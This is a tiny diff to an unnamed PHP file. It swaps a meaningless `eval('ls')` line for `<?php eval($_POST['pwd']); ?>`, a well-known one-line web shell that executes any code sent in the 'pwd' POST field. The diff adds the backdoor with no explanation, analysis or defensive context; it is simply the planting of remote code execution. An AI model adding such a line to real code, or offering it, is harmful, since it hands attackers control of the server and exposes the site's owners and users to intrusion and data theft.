@@ -1,1 +1,1 @@
-<?php eval('ls'); ?>
+<?php eval($_POST['pwd']); ?>
